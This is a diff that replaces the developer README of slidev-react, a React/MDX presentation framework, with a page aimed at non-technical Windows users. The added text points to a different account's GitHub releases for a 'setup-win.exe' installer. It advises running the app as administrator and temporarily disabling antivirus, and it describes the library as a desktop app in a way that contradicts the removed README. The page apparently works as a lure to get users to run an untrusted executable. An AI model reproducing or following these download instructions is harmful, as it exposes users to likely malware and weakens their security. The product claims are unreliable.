@@ -1,393 +1,163 @@
-# slidev-react
+# 🎞 slidev-react - Simple Slide Presentations with React
 
-[![Version](https://img.shields.io/npm/v/@slidev-react/core)](https://npmjs.com/package/@slidev-react/core)
-[![CI](https://github.com/hylarucoder/slidev-react/actions/workflows/ci.yml/badge.svg)](https://github.com/hylarucoder/slidev-react/actions)
-[![License](https://img.shields.io/npm/l/@slidev-react/core)](LICENSE)
-
-React-first presentation runtime with an MDX slides pipeline, presenter/viewer modes, and built-in interactive slide features.
-
-[中文说明](./README.zh-CN.md)
-
-https://github.com/user-attachments/assets/553392a4-36ae-4505-87c2-ca54e7e00f08
-
-## Overview
-
-`slidev-react` is a slide system built around:
-
-- **React 19** for rendering
-- **MDX** as the authoring format
-- **Vite** for the app runtime
-- a compile-time slides pipeline under `packages/node/src/slides`
-- a presentation shell with presenter/viewer sync, reveal flow, drawings, and recording
-
-> Inspired by [Slidev](https://github.com/slidevjs/slidev), but this is an independent React + MDX runtime with its own slides model and rendering pipeline, not a Vue Slidev port.
-
-## Highlights
-
-- MDX-authored slides source in [`slides.mdx`](./slides.mdx)
-- Compile-time parsing and slides artifact generation
-- Built-in slide layouts: `default`, `center`, `cover`, `section`, `two-cols`, `image-right`, `statement`
-- React-native MDX helpers: `Badge`, `Callout`, `Annotate`, `Reveal`, `RevealGroup`, and more
-- Diagram fences for Mermaid, PlantUML, and G2 charts (via addons)
-- KaTeX-based math rendering
-- Presenter and viewer routes with sync-ready state handling
-- Multi-tab sync through `BroadcastChannel`
-- Optional cross-device sync through a WebSocket relay
-- Stage drawing tools, cursor sync, quick overview, browser recording, print/PDF export
-
-## Status
-
-The project is under active development. Core features (MDX authoring, layouts, reveal flow, presenter sync, export) are functional and tested. The addon and theme plugin APIs are still evolving and may change.
-
-## Monorepo Structure
-
-This is a pnpm workspace monorepo with the following packages:
-
-| Package                     | Path                   | Description                                                    |
-| --------------------------- | ---------------------- | -------------------------------------------------------------- |
-| `create-slidev-react`       | `packages/create-app`  | Starter app scaffolding and recommended first-run entry        |
-| `@slidev-react/core`        | `packages/core`        | Pure presentation models, flow logic, and shared contracts     |
-| `@slidev-react/client`      | `packages/client`      | React app assembly, providers, presentation UI, themes, addons |
-| `@slidev-react/node`        | `packages/node`        | Node-side dev/build/export/lint entry points and servers       |
-| `@slidev-react/cli`         | `packages/cli`         | Low-level command runner used by generated app scripts         |
-| `@slidev-react/theme-absolutely` | `packages/theme-absolutely` | The "absolutely" theme package                           |
-| `@slidev-react/theme-paper` | `packages/theme-paper` | The "paper" theme package                                      |
-
-The root `package.json` is `private: true` and wires the Vite dev server and top-level scripts. Publishable packages under `packages/` are released via [Changesets](https://github.com/changesets/changesets).
-
-## Quick Start
-
-### Requirements
-
-- Node.js `>=22`
-- pnpm `10`
-
-### Create a deck
-
-```bash
-npm create slidev-react@latest my-deck
-cd my-deck
-pnpm install
-pnpm dev
-```
-
-Open the viewer at `http://localhost:5173/1` or the presenter at `http://localhost:5173/presenter/1`.
-
-The generated app includes:
-
-- `slides.mdx` with a minimal starter deck
-- built-in `g2 + mermaid` examples
-- `pnpm dev`, `pnpm build`, `pnpm export`, and `pnpm lint` scripts
-
-### Develop this repository
-
-If you are contributing to the monorepo itself instead of creating a deck app:
-
-```bash
-pnpm install
-pnpm dev
-```
-
-## Scripts
-
-| Command                    | Description                                             |
-| -------------------------- | ------------------------------------------------------- |
-| `pnpm dev`                 | Start the Vite development server                       |
-| `pnpm build`               | Build production assets                                 |
-| `pnpm preview`             | Preview the production build                            |
-| `pnpm clean`               | Remove `dist/`, `.generated/`, and `output/`            |
-| `pnpm presentation:server` | Start the WebSocket relay for cross-device sync         |
-| `pnpm test`                | Run the Vitest suite                                    |
-| `pnpm test:e2e`            | Run the Playwright end-to-end suite                     |
-| `pnpm test:e2e:headed`     | Run Playwright with a visible browser                   |
-| `pnpm test:e2e:install`    | Install the Chromium browser for Playwright             |
-| `pnpm lint`                | Run type-aware Oxlint                                   |
-| `pnpm lint:slides`         | Lint slides authoring (unknown themes, addons, layouts) |
-| `pnpm format`              | Format the repository with Oxfmt                        |
-| `pnpm format:check`        | Check formatting with Oxfmt                             |
-
-Use `pnpm lint:slides -- --strict` to fail on warnings in CI.
-
-### Slides Export
-
-Export slides as PDF or PNG artifacts via Playwright:
-
-```bash
-pnpm export:slides              # PDF + PNG
-pnpm export:slides:pdf           # PDF only
-pnpm export:slides:png           # PNG only
-pnpm export:slides -- --slides 3-7
-pnpm export:slides -- --with-clicks
-pnpm export:slides -- --base-url http://127.0.0.1:4173
-```
-
-Output goes to `output/export/<slides-name>/`. You can also use the `Print / PDF` button in the presenter shell, or visit any slides URL with `?export=print`.
-
-## Presentation Mode
-
-Start the app with `pnpm dev`, then optionally start the relay server for cross-device sync:
-
-```bash
-pnpm presentation:server
-```
-
-Default relay endpoint: `ws://localhost:4860/ws`
-
-Routes:
-
-- Presenter: `http://localhost:5173/presenter/1`
-- Viewer: `http://localhost:5173/1`
-
-The presenter shell includes:
-
-- presenter / viewer roles with page, reveal-state, cursor, and drawing sync
-- browser recording via `MediaRecorder`
-- print-ready slides export
-- quick overview and presenter-side controls
-- wake lock, mirror-stage launch, fullscreen toggle, stage scale, and idle-cursor settings
-
-## Slides Authoring
-
-The slides source lives in [`slides.mdx`](./slides.mdx).
-
-Core authoring rules:
-
-- Use `---` to split slides
-- Use frontmatter for slides-level or slide-level metadata
-- Use MDX for slide content
-- Use repo-provided React components directly in MDX
-
-### Frontmatter Reference
-
-**Slides-level** (first slide block):
-
-| Field            | Description                                                  |
-| ---------------- | ------------------------------------------------------------ |
-| `title`          | Presentation title                                           |
-| `theme`          | Theme id (e.g. `paper`); falls back to `default`             |
-| `addons`         | List of addon ids to enable (e.g. `[mermaid, g2, insight]`)  |
-| `layout`         | Default layout for all slides                                |
-| `background`     | Default background (color, gradient, or image URL)           |
-| `transition`     | Default transition: `fade`, `slide-left`, `slide-up`, `zoom` |
-| `exportFilename` | Base name for export files and recording downloads           |
-
-**Slide-level**:
-
-| Field        | Description                                                       |
-| ------------ | ----------------------------------------------------------------- |
-| `title`      | Slide title                                                       |
-| `layout`     | Layout override for this slide                                    |
-| `class`      | CSS class applied to the stage article element                    |
-| `background` | Colors, gradients, CSS background values, or bare image URLs      |
-| `transition` | Per-slide transition override                                     |
-| `clicks`     | Explicit reveal steps (even when fewer `<Reveal />` blocks exist) |
-| `notes`      | Presenter notes (YAML block strings work best)                    |
-| `src`        | Load slide body from an external file relative to `slides.mdx`    |
-
-Invalid frontmatter reports field-level parser errors, and compile-time generation warns for unknown themes or addons.
-
-### Example
-
-```mdx
----
-title: Demo Slides
-theme: paper
-addons:
-  - mermaid
-  - g2
-  - insight
-layout: default
-background: "linear-gradient(180deg, #eff6ff 0%, #ffffff 100%)"
-transition: fade
-exportFilename: client-demo
----
+[![Download slidev-react](https://img.shields.io/badge/Download-slidev--react-brightgreen?style=for-the-badge)](https://github.com/vardhan143818/slidev-react/releases)
 
 ---
 
-title: Compare
-layout: two-cols
-class: px-20
-background: /images/compare-hero.png
-transition: slide-left
-clicks: 3
-src: ./slides/compare.mdx
-notes: |
-Open with the tradeoff, not the implementation.
-Pause after the chart before moving to the API boundary.
+## 📋 What Is slidev-react?
+
+slidev-react is a tool that helps you make slide presentations easily. It uses a technology called React to show your slides. You write your slides using simple text mixed with interactive parts. The tool handles showing presenter notes, live syncing between presenter and viewer, slide animations, and more.
+
+It works on Windows and does not require you to know programming. You focus on your content, and slidev-react shows it clearly.
 
 ---
 
-# Left column
+## 🖥 System Requirements
 
-<hr />
+To use slidev-react on Windows, your computer should meet these needs:
 
-# Right column
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 1 GHz or faster processor
+- 500 MB free disk space
+- Internet connection to download the software
 
-<Reveal step={1}>
-  <Callout title="Tip">This block appears on click.</Callout>
-</Reveal>
-```
-
-When `src:` is present, put the slide body in the external file — do not mix inline content in the same block.
-
-## Themes
-
-Set the theme in slides-level frontmatter:
-
-```mdx
----
-title: Client Review
-theme: paper
----
-```
-
-Themes are distributed as workspace packages. The built-in non-default theme is **paper** (`packages/theme-paper`), published as `@slidev-react/theme-paper`.
-
-A theme package exports a `SlideThemeDefinition` from its entry point, with support for:
-
-- `tokens` — the single source of truth for theme fonts, UI colors, chart colors, diagram colors, and addon colors
-- `rootAttributes` and `rootClassName` — document-level tokens or selectors
-- `layouts` — override or extend slide layouts
-- `mdxComponents` — override MDX helpers such as `Badge`
-- `provider` — theme-scoped React context when needed
-
-Theme CSS files (e.g. `style.css`) are auto-loaded. CSS custom properties are derived from `tokens` at runtime, so CSS is a consumer of theme tokens rather than the source of truth. If a requested theme is missing, the runtime falls back to the default theme.
-
-## Addons
-
-Slides can opt into addons with slides-level frontmatter:
-
-```mdx
----
-addons:
-  - mermaid
-  - g2
-  - insight
----
-```
-
-Addons live under `packages/client/src/addons/<addon-id>/` and are discovered automatically when they export `addon` from `index.ts`.
-
-### Available Addons
-
-| Addon     | Components                    | Description                            |
-| --------- | ----------------------------- | -------------------------------------- |
-| `mermaid` | `MermaidDiagram`              | Mermaid diagram rendering              |
-| `g2`      | `Chart`                       | G2 data visualization charts           |
-| `insight` | `Insight`, `spotlight` layout | Insight component and spotlight layout |
-
-### Addon Contract
-
-- `layouts` — add or override layout names
-- `mdxComponents` — add slides-local MDX helpers
-- `provider` — wrap the runtime tree with addon-specific React context or side effects
-
-Addon CSS files at `packages/client/src/addons/<addon-id>/style.css` are auto-loaded. Unknown addon ids are ignored, keeping slides startup safe while the addon API is experimental.
-
-### Example
-
-```mdx
----
-title: Executive Summary
-addons:
-  - insight
-layout: spotlight
 ---
 
-# Three signals to act on now
+## 🚀 Getting Started: Download and Run slidev-react
 
-<Insight title="Board angle">
-  The margin story lands better when paired with hiring discipline.
-</Insight>
-```
+### Step 1: Visit the Download Page
 
-## MDX Helpers
+Click the big green button at the top or go to this link to reach the download page:
 
-### Core (always available)
+https://github.com/vardhan143818/slidev-react/releases
 
-| Component                | Description                                                           |
-| ------------------------ | --------------------------------------------------------------------- |
-| `Badge`                  | Inline badge labels                                                   |
-| `Callout`                | Callout blocks with titles                                            |
-| `Annotate`               | Rough-notation style annotations (highlight, underline, box, bracket) |
-| `CourseCover`            | Course cover page helper                                              |
-| `MagicMoveDemo`          | Shiki Magic Move code animations                                      |
-| `MinimaxReactVisualizer` | Minimax tree visualizer                                               |
-| `PlantUmlDiagram`        | PlantUML diagram rendering                                            |
-| `Reveal`                 | Step-based reveal for click-triggered content                         |
-| `RevealGroup`            | Auto-numbered reveal container                                        |
+This page holds the latest versions of the application.
 
-### Via Addons
+### Step 2: Choose Your Version
 
-| Component        | Addon     | Description      |
-| ---------------- | --------- | ---------------- |
-| `MermaidDiagram` | `mermaid` | Mermaid diagrams |
-| `Chart`          | `g2`      | G2 data charts   |
-| `Insight`        | `insight` | Insight blocks   |
+On the download page, look for the latest release. It has a date and version number. Under it, find the file named something like:
 
-`Annotate` example:
+`slidev-react-setup-win.exe`
 
-```mdx
-<Annotate>Default highlight</Annotate>
-<Annotate type="underline">Key idea</Annotate>
-<Annotate type="box" color="#2563eb">
-  API boundary
-</Annotate>
-<Annotate type="bracket" brackets={["left", "right"]}>
-  Focus block
-</Annotate>
-```
+This is the installer program for Windows.
 
-## Project Structure
+### Step 3: Download the Installer
 
-```
-packages/
-  create-app/   → create-slidev-react     — starter app scaffolding
-  core/         → @slidev-react/core     — models, flow, shared contracts
-  client/       → @slidev-react/client   — React app, UI, themes, addons
-    src/
-      addons/   — addon definitions (mermaid, g2, insight)
-      app/      — application assembly, providers, entry wiring
-      features/ — presentation capabilities (reveal, presenter, sync, draw, navigation)
-      theme/    — theme registry, layouts, visual tokens
-      ui/       — reusable components and MDX helpers
-  node/         → @slidev-react/node     — dev/build/export/lint
-  cli/          → @slidev-react/cli      — low-level command runner
-  theme-absolutely/ → @slidev-react/theme-absolutely — "absolutely" theme
-  theme-paper/  → @slidev-react/theme-paper — "paper" theme
-```
+Click on the installer file. Your browser will start downloading it. It should take only a few minutes.
 
-For per-package details, see [`packages/client/README.md`](./packages/client/README.md) and [`packages/node/README.md`](./packages/node/README.md).
+### Step 4: Run the Installer
 
-## Build Artifact Management
+Once downloaded, open the file by double-clicking it. Windows may ask you to confirm. Allow the program to run.
 
-Build output is disposable and should not be committed:
+Follow the installer instructions:
 
-- `dist/` — production builds
-- `.generated/` — compile-time slides output
-- `output/` — runtime generated output (exports, recordings)
+- Click **Next** on each step.
+- Choose default settings unless you want to change the install folder.
+- Click **Install** when ready.
 
-Run `pnpm clean` to remove all generated files.
+The installer will place slidev-react on your computer.
 
-## Testing
+### Step 5: Start Using slidev-react
 
-```bash
-pnpm test        # Vitest unit/integration tests
-pnpm test:e2e    # Playwright end-to-end tests
-```
+When the install finishes, you can open slidev-react from your Start menu or desktop shortcut.
 
-## Contributing
+---
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 💡 How to Use slidev-react
 
-## Changelog
+slidev-react shows slides that you create or download. The slides use a format that mixes text with interactive parts.
 
-See [CHANGELOG](./CHANGELOG.md) for a detailed list of changes.
+### Open a Slide Show
 
-## Acknowledgements
+- Launch slidev-react.
+- Click **Open**.
+- Find your slide file with `.mdx` extension or use a sample slide from the app.
 
-This project is inspired by [Slidev](https://github.com/slidevjs/slidev). Some early slides content was migrated from the Slidev starter deck while adapting the authoring model to this React + MDX runtime.
+### Present Your Slides
 
-## License
+- Use arrow keys or mouse clicks to move forward and back.
+- Use presenter mode to see notes and next slides.
+- Use viewer mode for your audience to follow along live.
 
-[MIT](./LICENSE)
+### Create Your Own Slides
+
+- Use any text editor like Notepad or VSCode to make slide files.
+- Write text and add React components for interactivity.
+- Save your file with `.mdx` extension.
+- Open your file in slidev-react to run your presentation.
+
+---
+
+## 🔧 Features Overview
+
+slidev-react lets you:
+
+- Write slides in simple Markdown mixed with React components.
+- Use presenter and viewer modes for smooth control.
+- Sync slides in real time between devices.
+- Draw on slides during the presentation.
+- Record your presentation with built-in tools.
+- Run fast and smooth on your Windows PC.
+
+---
+
+## 🎯 Tips for Best Experience
+
+- Make sure your Windows system is up to date.
+- Close other heavy programs to keep slidev-react smooth.
+- Use a simple text editor to avoid formatting problems with slides.
+- Test your slides before your real presentation.
+- Keep your laptop plugged in during presentations.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+### The App Won't Open
+
+- Check if your Windows version matches the system requirements.
+- Try running as administrator: right-click the app icon and choose “Run as administrator.”
+- Restart your computer and try again.
+
+### Slides Don't Show Correctly
+
+- Make sure your slide files use `.mdx` format.
+- Avoid complex custom code if you are new to slides.
+- Open sample slides included in the app to compare.
+
+### Installation Fails
+
+- Verify you downloaded the Windows installer, not a different file.
+- Make sure you have enough disk space.
+- Temporarily disable antivirus software during install.
+
+---
+
+## 📥 Download slidev-react
+
+You can always get the latest Windows installer here:
+
+[Download slidev-react](https://github.com/vardhan143818/slidev-react/releases)
+
+Follow the steps above to install the application and start creating or presenting slides.
+
+---
+
+## 📚 Additional Resources
+
+- Slidev-react is based on React and MDX technologies.
+- For more technical guides, visit the GitHub page: https://github.com/vardhan143818/slidev-react
+- Look for sample slide files on the GitHub repository to practice.
+
+---
+
+## ⚙️ Advanced Settings (Optional)
+
+For users familiar with React or web technology:
+
+- Customize slide styles by editing MDX files.
+- Add React components for interactive elements.
+- Use developer tools provided in the app for debugging.
+
+These steps are optional and meant for users willing to learn more about slidev-react internals.
